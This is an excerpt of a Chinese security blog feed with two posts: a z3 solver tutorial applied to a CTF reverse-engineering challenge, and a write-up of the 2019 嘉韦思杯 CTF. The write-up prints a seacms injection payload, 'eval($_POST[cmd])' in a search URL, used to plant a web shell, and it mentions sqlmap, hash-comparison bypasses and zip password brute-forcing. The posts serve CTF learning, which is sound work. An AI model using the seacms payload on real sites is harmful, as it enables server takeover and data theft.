    <content type="html"><![CDATA[<p>本文首发于：<a href="安恒讲武堂" title="https://mp.weixin.qq.com/s/GKbxGaWcBPfEuBGtWQ3uNw">安恒讲武堂</a></p><p>前几天在群里看到有人聊到z3，正好在寒假的时候仔细研究过这个模块，今天就和大家分享下z3的简易使用方法和在ctf中该模块对于求解逆向题的帮助</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性，通俗的来讲我们可以简单理解为它是一个解方程的计算器</p><h2 id="SMT"><a href="#SMT" class="headerlink" title="SMT"></a>SMT</h2><p>SMT即可满足性模理论，它是对一个实际问题求解的特征描述，这些特征就是我们所求解的特征，SMT会使用一个或多个这样的特征描述式求解，再取每一个特征描述式所对应解的交集。</p><p>详细关于SMT的理论可以参考：<a href="https://www.cnblogs.com/steven-yang/p/7104068.html" target="_blank" rel="noopener">https://www.cnblogs.com/steven-yang/p/7104068.html</a></p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>在Python中使用Z3模块，我们的所求结果一般有以下几种数据类型</p><pre><code>Int   #整型Bool  #布尔型Array #数组BitVec(&apos;a&apos;,8) #char型</code></pre><p>其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示</p><h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><p>在Python中使用该模块，我们通常用到如下几个语句</p><p><strong>Solver()</strong></p><p>Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解</p><p><strong>add()</strong></p><p>add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p><p><strong>check()</strong></p><p>该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat</p><p><strong>model()</strong></p><p>在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。</p><h2 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h2><p>linux下可用如下命令：</p><pre><code>git clone https://github.com/Z3Prover/z3.gitcd z3python scripts/mk_make.pycd buildmakemake install</code></pre><h1 id="z3的简单使用"><a href="#z3的简单使用" class="headerlink" title="z3的简单使用"></a>z3的简单使用</h1><h2 id="求解流程"><a href="#求解流程" class="headerlink" title="求解流程"></a>求解流程</h2><p>上文提到我们可以将z3理解为一个解方程的计算器，对于求解方程，我们通常会经历四个步骤：设未知数，列方程，解方程，得到正解</p><p>使用z3模块，在我的眼中也是同我们解方程一样需要经历四个步骤，下面我们简单来看一下</p><p>假设有方程组：</p><pre><code>30x+15y=67512x+5y=265</code></pre><p>我们使用z3来解这个方程组：</p><p><strong>1.设未知数</strong></p><pre><code>In [1]: from z3 import *In [2]: x = Real(&apos;x&apos;)In [3]: y = Real(&apos;y&apos;)</code></pre><p><strong>2.列方程</strong></p><pre><code>In [4]: s = Solver()In [5]: s.add(30*x+15*y==675)In [6]: s.add(12*x+5*y==265)</code></pre><p><strong>3.判断方程解的情况并解方程</strong></p><pre><code>In [7]: s.check()Out[7]: satIn [8]: result = s.model()</code></pre><p><strong>4.得出正解</strong></p><pre><code>In [9]: print result[y = 5, x = 20]</code></pre><p>在交互环境中，我们的求解过程如图</p><p><img src="https://i.loli.net/2019/04/06/5ca80a3429c22.jpg" alt="5.jpg"></p><p>最终完整的代码如下：</p><pre><code>from z3 import *x = Real(&apos;x&apos;)y = Real(&apos;y&apos;)s = Solver()s.add(30*x+15*y==675)s.add(12*x+5*y==265)if s.check() == sat:    result = s.model()    print resultelse:    print &apos;no result&apos;</code></pre><p>可以看到我们很轻松的得到了方程组的解</p><p><img src="https://i.loli.net/2019/04/06/5ca80aced6bf2.jpg" alt="6.jpg"></p><h2 id="利用z3解逻辑算数题"><a href="#利用z3解逻辑算数题" class="headerlink" title="利用z3解逻辑算数题"></a>利用z3解逻辑算数题</h2><p>可能上面解方程组大家觉得这个模块给我们带来的方便并没有那么大，那么通过下面的题目我们或许会对z3有一个全新的认识</p><p>在网上翻了很多题目，最终我找到了15年的一道公务员考试题</p><p><img src="https://i.loli.net/2019/04/06/5ca80d2aac914.jpg" alt="7.jpg"></p><p>这个问题的逻辑稍显复杂，我们现在用z3做一下，同样也需要经历上面四个步骤：设，列，解，得</p><p>设：2014年小李年龄：a，小李弟弟年龄：b，小王年龄：c，小王哥哥年龄：d</p><p>节省篇幅，直接写出求解代码：</p><pre><code>from z3 import *a = Real(&apos;a&apos;)b = Real(&apos;b&apos;)c = Real(&apos;c&apos;)d = Real(&apos;d&apos;)s = Solver()s.add(b+2==a)s.add(c+2==d)s.add(a+5==d)s.add(b+c-20-20==15)if s.check()==sat:    print s.model()else:    print &quot;no result&quot;</code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2019/04/06/5ca810dd35daf.jpg" alt="8.jpg"></p><p>可以看到我们仅用几行代码就得出了答案，如果用普通的解法，我们要算4个方程所组成的方程组，所以使用z3有时候会大大增加我们的计算效率，简化我们的计算步骤。</p><h1 id="z3在逆向题目中的应用"><a href="#z3在逆向题目中的应用" class="headerlink" title="z3在逆向题目中的应用"></a>z3在逆向题目中的应用</h1><p>本篇以ISCC2018的一道RE题目为例，题目名为：My math is bad</p><p>将文件拖入ida中定位到main函数，F5反编译</p><p><img src="https://i.loli.net/2019/04/06/5ca8138baa122.jpg" alt="9.jpg"></p><p>可以看到有一个if判断，猜测if中的函数为关键函数，进入该函数</p><p><img src="https://i.loli.net/2019/04/06/5ca81401ead52.jpg" alt="10.jpg"></p><p>在这里看到了rand()函数，这是一个生成伪随机数的函数，所以我们几乎不可能通过逆向的方式，来将flag计算出来，继续阅读代码，发现该随机数种子是固定的，我们可以将种子计算出来，这样就可以进而获得系统生成的随机数，在计算种子的时候，我们可以使用z3模块</p><p>为了增加可读性，将关键函数的反汇编代码修饰一下：</p><pre><code>  __int64 v1; // ST40_8  __int64 v2; // ST48_8  __int64 v3; // [rsp+20h] [rbp-60h]  __int64 v4; // [rsp+28h] [rbp-58h]  __int64 v5; // [rsp+30h] [rbp-50h]  __int64 v6; // [rsp+38h] [rbp-48h]  __int64 v7; // [rsp+50h] [rbp-30h]  __int64 v8; // [rsp+58h] [rbp-28h]  __int64 v9; // [rsp+60h] [rbp-20h]  __int64 v10; // [rsp+68h] [rbp-18h]  __int64 v11; // [rsp+70h] [rbp-10h]  __int64 v12; // [rsp+78h] [rbp-8h]  if ( strlen(s) != 32 )    return 0LL;  v3 = unk_6020B0;  v4 = unk_6020B4;  v5 = unk_6020B8;  v6 = unk_6020BC;  if ( a * *s - b * c != 2652042832920173142LL )    goto LABEL_15;  if ( 3LL * c + 4LL * b - a - 2LL * *s != 397958918 )    goto LABEL_15;  if ( 3 * *s * b - c * a != 3345692380376715070LL )    goto LABEL_15;  if ( 27LL * a + *s - 11LL * b - c != 40179413815LL )    goto LABEL_15;  srand(c ^ a ^ *s ^ b);  v1 = rand() % 50;  v2 = rand() % 50;  v7 = rand() % 50;  v8 = rand() % 50;  v9 = rand() % 50;  v10 = rand() % 50;  v11 = rand() % 50;  v12 = rand() % 50;  if ( v6 * v2 + v3 * v1 - v4 - v5 != 61799700179LL    || v6 + v3 + v5 * v8 - v4 * v7 != 48753725643LL    || v3 * v9 + v4 * v10 - v5 - v6 != 59322698861LL    || v5 * v12 + v3 - v4 - v6 * v11 != 51664230587LL )  {LABEL_15:    result = 0LL;  }  else  {    result = 1LL;  }  return result;}</code></pre><p>首先我们来计算下a,s,b,c的值：</p><pre><code>from z3 import *a = Int(&apos;a&apos;)b = Int(&apos;b&apos;)s = Int(&apos;s&apos;)c = Int(&apos;c&apos;)l = Solver()l.add(a*s-b*c==2652042832920173142)l.add(3*c+4*b-a-2*s==397958918)l.add(3 *s * b - c * a == 3345692380376715070)l.add(27 * a + s - 11 * b - c == 40179413815)if l.check()==sat:    print l.model()else:    print &apos;no result&apos;</code></pre><p><img src="https://i.loli.net/2019/04/06/5ca81ccc941ff.jpg" alt="11.jpg"></p><p>然后我们计算出srand(c ^ a ^ *s ^ b);中c^a^s^b的值</p><pre><code>c = 829124174b = 862734414s = 1869639009a = 1801073242result = a^b^c^sprint result</code></pre><p>result的值为103643451</p><p>接下来我们继续跟进程序流程，计算rand函数所生成的几个值</p><p><img src="https://i.loli.net/2019/04/06/5ca82e010c4ae.jpg" alt="12.jpg"></p><p>使用ida动态调试程序，跳转到srand()函数，因为是直接跳过来的，srand()还没有参数，而刚才我们已将该参数的值通过z3计算了出来，所以在程序运行到mov     edi, eax时，直接将eax的值改为103643451即可</p><p>然后我们跟进程序，得到了v1的值</p><p><img src="https://i.loli.net/2019/04/06/5ca82ffb172a5.jpg" alt="14.jpg"></p><p>继续跟进获得了下面的几个生成值</p><pre><code>v1 = 0x16v2 = 0x27v7 = 0x2dv8=  0x2dv9 = 0x23 v10= 0x29 v11 = 0xdv12 = 0x24</code></pre><p>接着我们到了if的判断</p><p><img src="https://i.loli.net/2019/04/06/5ca83192d0a23.jpg" alt="15.jpg"></p><p>其中v3 v4 v5 v6是未知的，所以在这里我们可以设四个未知数，其他数我们通过前面已经计算出来了，使用z3求解这四个未知数即可</p><pre><code>from z3 import *v3 = Int(&apos;v3&apos;)v4 = Int(&apos;v4&apos;)v5 = Int(&apos;v5&apos;)v6 = Int(&apos;v6&apos;)v1 = 0x16v2 = 0x27v7 = 0x2dv8=  0x2dv9 = 0x23v10= 0x29v11 = 0xdv12 = 0x24l = Solver()l.add(v6 * v2 + v3 * v1 - v4 - v5 == 61799700179)l.add(v6 + v3 + v5 * v8 - v4 * v7 == 48753725643)l.add(v3 * v9 + v4 * v10 - v5 - v6 == 59322698861)l.add(v5 * v12 + v3 - v4 - v6 * v11 == 51664230587)if l.check() == sat:    print l.model()else:    print &apos;no result&apos;</code></pre><p>运行结果</p><p><img src="https://i.loli.net/2019/04/06/5ca8328b64699.jpg" alt="16.jpg"></p><p>至此我们需要输入的值都计算出来了</p><pre><code>c = 829124174b = 862734414s = 1869639009a = 1801073242v6 = 1195788129v4 = 828593230v3 = 811816014v5 = 1867395930</code></pre><p>这里我们需要将abcs的顺序确定一下，在bss段中可看到其顺序</p><p><img src="https://i.loli.net/2019/04/06/5ca834ef90a97.jpg" alt="17.jpg"></p><p>然后我们需要将这些数字转换为字符串输入，这里用到了libnum库</p><pre><code>import libnumc = 829124174b = 862734414s = 1869639009a = 1801073242v6 = 1195788129v4 = 828593230v3 = 811816014v5 = 1867395930array = [s,a,c,b,v3,v4,v5,v6]result = &quot;&quot;for i in array:    result = result + libnum.n2s(i)[::-1]print result</code></pre><p>运行脚本</p><p><img src="https://i.loli.net/2019/04/06/5ca8395b629d4.jpg" alt="18.jpg"></p><p>将字符串输入后我们即可得到flag</p><p><img src="https://i.loli.net/2019/04/06/5ca839bde9e02.jpg" alt="19.jpg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>z3是一个强大的约束求解器，它不仅能处理一些看起来很复杂的逻辑问题，在逆向领域中往往可以简化我们计算步骤，增加求解效率，尤其是在ctf比赛中一些繁杂的RE题目通过z3来解往往显得非常简单，我们在解决问题时如果能灵活应用z3，往往会有意想不到的效果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于：&lt;a href=&quot;安恒讲武堂&quot; title=&quot;https://mp.weixin.qq.com/s/GKbxGaWcBPfEuBGtWQ3uNw&quot;&gt;安恒讲武堂&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前几天在群里看到有人聊到z3，正好在寒假的时候仔细研究过这个模块，今天就和大家分
      
    
    </summary>
    
    
    
      <category term="系统总结" scheme="https://yml-sec.top/tags/%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2019嘉韦思杯线上赛wp</title>
    <link href="https://yml-sec.top/2019/04/01/2019%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/"/>
    <id>https://yml-sec.top/2019/04/01/2019%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/</id>
    <published>2019-04-01T09:13:33.000Z</published>
    <updated>2019-04-01T09:14:31.223Z</updated>
    
    <content type="html"><![CDATA[<p>周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会）</p><h2 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h2><p>根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章</p><p><a href="https://www.cnblogs.com/leixiao-/p/9786034.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/9786034.html</a></p><p>根据文章中的描述，构造如下payload</p><pre><code>http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</code></pre><p>用蚁剑链接，在服务器根目录下发现flag</p><p><img src="https://i.loli.net/2019/03/30/5c9f24863871e.jpg" alt="2.jpg"></p><h2 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h2><p>很简单的题目，用sqlmap就可以跑出来</p><p><img src="https://i.loli.net/2019/03/30/5c9f26447c3fd.jpg" alt="3.jpg"></p><p><img src="https://i.loli.net/2019/03/30/5c9f264479d47.jpg" alt="4.jpg"></p><p><img src="https://i.loli.net/2019/03/30/5c9f26447fce4.jpg" alt="5.jpg"></p><p><img src="https://i.loli.net/2019/03/30/5c9f264481d29.jpg" alt="6.jpg"></p><h2 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h2><p>base64解密链接中字符串，得到一串jsfuck，在浏览器执行即可得到flag</p><p><img src="https://i.loli.net/2019/03/30/5c9f2729d625d.jpg" alt="7.jpg"></p><h2 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h2><p>这应该是一串不全的base64代码，解密过程中报了一次错，然后站点自动补了一段字符串</p><p><img src="https://i.loli.net/2019/03/30/5c9f2898855f5.jpg" alt="8.jpg"></p><p>经过几次解密</p><p>得到</p><p>fB__l621a4h4g_ai{&amp;i}</p><p>栅栏解密即可</p><p><img src="https://i.loli.net/2019/03/30/5c9f287e2aa96.jpg" alt="9.jpg"></p><h2 id="飞虎队"><a href="#飞虎队" class="headerlink" title="飞虎队"></a>飞虎队</h2><p>题目是希尔加密</p><p>在网上搜索很久</p><p>找到了下面的站点</p><p><a href="http://2-dreamfever.lofter.com/post/1d226cf1_748daf4" target="_blank" rel="noopener">http://2-dreamfever.lofter.com/post/1d226cf1_748daf4</a></p><p>惊喜的是里面的矩阵和题目中的一样</p><p>照着他的思路我们把密文转成数字</p><p>a=0,b=1,c=2,d=3…</p><p>解密矩阵</p><pre><code>8  16  278  99  2427 24  27</code></pre><p>矩阵为3*3 所以将密文3个分为一组 去乘解密矩阵然后mod(26)</p><p>得到</p><p>hillisflagxx</p><h2 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h2><p>上脚本</p><pre><code>import reimport requestss = requests.Session()url = &apos;http://47.103.43.235:82/web/a/index.php&apos;r = s.get(url)#r.encoding = &apos;utf-8&apos;print(r.text)shi = re.compile(&apos;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&apos;,re.S)num = re.findall(shi, r.text)print(num)#print (&apos;result:\n\n%s=%d\n&apos; % (num, eval(num)))#r = s.post(url, data={&apos;result&apos;: eval(num[0])})#print (r.text)numstr = &quot;&quot;result = eval(num[0])print(result)html = s.post(url,data={&apos;result&apos;:result})print(html.text)</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f2acd4c161.jpg" alt="10.jpg"></p><h2 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h2><p>扫描二维码，没发现有用的信息</p><p><img src="https://i.loli.net/2019/03/30/5c9f2ce79b9d0.jpg" alt="11.jpg"></p><p>winhex打开，在末尾发现zip数据段，提取出来</p><p>根据提示QQ号，暴力破解压缩包密码</p><p><img src="https://i.loli.net/2019/03/30/5c9f2de98dff8.jpg" alt="13‘.jpg"></p><p>打开即可获得flag</p><h2 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h2><p>打开题目，查看源码，发现index.phps</p><p><img src="https://i.loli.net/2019/03/30/5c9f2e7766ab5.jpg" alt="14.jpg"></p><p>下载后</p><p><img src="https://i.loli.net/2019/03/30/5c9f2ebb9ff8b.jpg" alt="15.jpg"></p><p>两个字符串不同但是sha1值要相同，这里可以用数组绕过</p><p><img src="https://i.loli.net/2019/03/30/5c9f2f320cdb5.jpg" alt="16.jpg"></p><h2 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h2><p>基础的RSA，用RSAtools跑一下就出来了</p><p><img src="https://i.loli.net/2019/03/30/5c9f300c36891.jpg" alt="17.jpg"></p><h2 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h2><p>打开题目查看源码，发现了如下代码</p><p><img src="https://i.loli.net/2019/03/30/5c9f307c82b64.jpg" alt="18.jpg"></p><p>MD5碰撞的题目，网上有现成的整理的payload</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10029887.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10029887.html</a></p><h2 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h2><p><img src="https://i.loli.net/2019/03/30/5c9f32933058e.jpg" alt="19.jpg"></p><p>题目是这样的</p><p>然后提示flag格式，说明flag{和密文的前五位是对应的</p><p>转换一下密文和flag{的ascii码对应的数值</p><p>脚本：</p><pre><code>a = &quot;bg[`s&quot;b = &quot;flag{&quot;a = list(a)b = list(b)for i in b:    print(ord(i))print(&apos;\n\n&apos;)for e in a:    print(ord(e))</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f337b432be.jpg" alt="20.jpg"></p><p>可以看到他们ascii码对应数值的差是递增的4,5,6,7……</p><p>这样题目就清晰了，解密flag脚本如下</p><pre><code>a = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;a = list(a)temp = 4flag = &quot;&quot;for i in a:    print(ord(i))    result = ord(i)+temp    temp = temp+1    flag = flag + chr(result)print(flag)</code></pre><p><img src="https://i.loli.net/2019/03/30/5c9f341619bb4.jpg" alt="21.jpg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可能是是第一届的原因吧，主办方或许有的地方经验还不太够，但是也能看出主办方是花了一些心思的，尤其是UI好评，也希望他们越办越好。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会）&lt;/p&gt;
&lt;h2 id=&quot;作战计划&quot;&gt;&lt;a href=&quot;#作战计划&quot; class=&quot;headerlink&quot; title=&quot;作战计划&quot;&gt;&lt;/a&gt;作战计划&lt;/h2&gt;&lt;p&gt;根据题目是seacms,百
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
</feed>
